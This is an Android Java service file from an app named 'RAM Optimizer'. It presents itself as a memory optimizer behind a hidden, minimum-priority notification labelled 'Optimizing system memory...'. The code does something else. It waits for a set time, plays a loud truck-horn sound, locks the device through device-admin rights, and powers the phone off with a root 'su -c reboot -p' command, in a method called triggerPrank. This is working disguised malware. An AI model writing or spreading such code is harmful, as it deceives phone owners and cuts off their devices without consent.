package com.system.ramoptimizer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.media.MediaPlayer;
import android.os.IBinder;

import androidx.core.app.NotificationCompat;

import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;

public class SchedulerService extends Service {

    private static final String CHANNEL_ID = "ram_opt_channel";
    private Timer timer;
    private MediaPlayer mediaPlayer;
    private int targetHour, targetMinute, targetAmPm, audioResId;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            targetHour = intent.getIntExtra("hour", 12);
            targetMinute = intent.getIntExtra("minute", 0);
            targetAmPm = intent.getIntExtra("ampm", 0);
            audioResId = intent.getIntExtra("audioResId", R.raw.truck_horn);
        } else {
            android.content.SharedPreferences prefs = getSharedPreferences("ramopt", MODE_PRIVATE);
            targetHour = prefs.getInt("hour", 12);
            targetMinute = prefs.getInt("minute", 0);
            targetAmPm = prefs.getInt("ampm", 0);
            audioResId = prefs.getInt("audioResId", R.raw.truck_horn);
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("RAM Optimizer")
                .setContentText("Optimizing system memory...")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        startForeground(1, notification);
        startChecking();

        return START_STICKY;
    }

    private void startChecking() {
        if (timer != null) timer.cancel();
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkTime();
            }
        }, 0, 10000);
    }

    private void checkTime() {
        Calendar now = Calendar.getInstance();
        int currentHour12 = now.get(Calendar.HOUR);
        if (currentHour12 == 0) currentHour12 = 12;
        int currentMinute = now.get(Calendar.MINUTE);
        int currentAmPm = now.get(Calendar.AM_PM);

        if (currentAmPm == targetAmPm &&
                currentHour12 == targetHour &&
                currentMinute == targetMinute) {
            timer.cancel();
            triggerPrank();
        }
    }

    private void triggerPrank() {
        try {
            if (mediaPlayer != null) mediaPlayer.release();
            mediaPlayer = MediaPlayer.create(this, audioResId);
            if (mediaPlayer != null) {
                mediaPlayer.setOnCompletionListener(mp -> {
                    mp.release();
                    shutdownDevice();
                });
                mediaPlayer.start();
            } else {
                shutdownDevice();
            }
        } catch (Exception e) {
            shutdownDevice();
        }
    }

    private void shutdownDevice() {
        try {
            android.content.SharedPreferences prefs = getSharedPreferences("ramopt", MODE_PRIVATE);
            prefs.edit().putBoolean("isSet", false).apply();

            // Try Device Admin shutdown first
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                dpm.lockNow();
                // Short delay then wipe/shutdown
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"});
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }, 500);
            } else {
                // Fallback to root
                Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"});
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN);
        channel.setDescription("System memory management");
        channel.setShowBadge(false);
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) manager.createNotificationChannel(channel);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (mediaPlayer != null) mediaPlayer.release();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
